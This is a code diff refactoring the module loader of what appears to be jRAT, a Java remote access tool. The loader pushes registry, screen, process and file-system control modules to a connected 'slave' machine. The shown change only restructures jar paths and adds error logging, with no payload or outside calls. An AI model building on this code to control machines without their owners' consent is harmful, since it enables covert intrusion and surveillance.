@@ -24,28 +24,34 @@ public class ModuleLoader {
      */
     private static class ModuleData {
 
-        public String controllerPath;
-        public String clientPath;
+        public String pathPrefix;
         public String controllerMain;
         public String clientMain;
         public long seed;
 
-        public ModuleData(String controllerPath, String clientPath, String controllerMain, String clientMain) {
-            this.controllerPath = controllerPath;
-            this.clientPath = clientPath;
+        public ModuleData(String pathPrefix, String controllerMain, String clientMain) {
+            this.pathPrefix = pathPrefix;
             this.controllerMain = controllerMain;
             this.clientMain = clientMain;
             this.seed = new Random().nextLong();
+        }
+
+        public File getControllerFile() {
+            return new File("modules", this.pathPrefix + "-controller.jar");
+        }
+
+        public File getClientFile() {
+            return new File("modules", this.pathPrefix + "-client.jar");
         }
     }
 
     private static final List<ModuleData> modules = new ArrayList<ModuleData>();
 
     static {
-        modules.add(new ModuleData( "registry-controller.jar", "registry-client.jar","jrat.module.registry.RegistryControllerModule", "jrat.module.registry.RegistryClientModule"));
-        modules.add(new ModuleData("screen-controller.jar", "screen-client.jar", "jrat.module.screen.ScreenControllerModule", "jrat.module.screen.ScreenClientModule"));
-        modules.add(new ModuleData("process-controller.jar", "process-client.jar", "jrat.module.process.ProcessControllerModule", "jrat.module.process.ProcessClientModule"));
-        modules.add(new ModuleData("fs-controller.jar", "fs-client.jar", "jrat.module.fs.FileSystemControllerModule", "jrat.module.fs.FileSystemClientModule"));
+        modules.add(new ModuleData( "registry", "jrat.module.registry.RegistryControllerModule", "jrat.module.registry.RegistryClientModule"));
+        modules.add(new ModuleData("screen", "jrat.module.screen.ScreenControllerModule", "jrat.module.screen.ScreenClientModule"));
+        modules.add(new ModuleData("process", "jrat.module.process.ProcessControllerModule", "jrat.module.process.ProcessClientModule"));
+        modules.add(new ModuleData("fs", "jrat.module.fs.FileSystemControllerModule", "jrat.module.fs.FileSystemClientModule"));
     }
 
     /**
@@ -53,18 +59,26 @@ public class ModuleLoader {
      * @throws Exception
      */
     public static void load() throws Exception {
-        for (ModuleData mod : modules) {
-            // add module JAR to classpath
-            Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
-            method.setAccessible(true);
-            method.invoke(ClassLoader.getSystemClassLoader(), new File("modules", mod.controllerPath).toURI().toURL());
+        Logger.log("Loading " + modules.size() + " modules...");
 
-            // invoke init() on module
-            Class<Module> clazz = (Class<Module>) ModuleLoader.class.getClassLoader().loadClass(mod.controllerMain);
-            Constructor<?> ctor = clazz.getDeclaredConstructor();
-            ctor.setAccessible(true);
-            Module module = (Module) ctor.newInstance();
-            module.init();
+        for (ModuleData mod : modules) {
+            try {
+                // add module JAR to classpath
+                Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
+                method.setAccessible(true);
+                method.invoke(ClassLoader.getSystemClassLoader(), mod.getControllerFile().toURI().toURL());
+
+                // invoke init() on module
+                Class<Module> clazz = (Class<Module>) ModuleLoader.class.getClassLoader().loadClass(mod.controllerMain);
+                Constructor<?> ctor = clazz.getDeclaredConstructor();
+                ctor.setAccessible(true);
+                Module module = (Module) ctor.newInstance();
+                module.init();
+                Logger.log("\t" + mod.getControllerFile());
+            } catch (Exception ex) {
+                Logger.log("\t" + mod.getControllerFile() + " failed");
+                ex.printStackTrace();
+            }
         }
     }
 
@@ -82,7 +96,7 @@ public class ModuleLoader {
 
             int total = 0;
 
-            JarInputStream jis = new JarInputStream(new FileInputStream(new File("modules", mod.clientPath)));
+            JarInputStream jis = new JarInputStream(new FileInputStream(mod.getClientFile()));
             JarEntry entry;
             while ((entry = jis.getNextJarEntry()) != null) {
                 int size = (int) entry.getSize();
@@ -116,7 +130,7 @@ public class ModuleLoader {
 
             // indicate that there are no entries left for this module
             slave.writeBoolean(false);
-            Logger.log("\twrote module '" + mod.clientMain + "' (" + total + " b)");
+            Logger.log("wrote module '" + mod.clientMain + "' (" + total + " b)");
         }
     }
 }
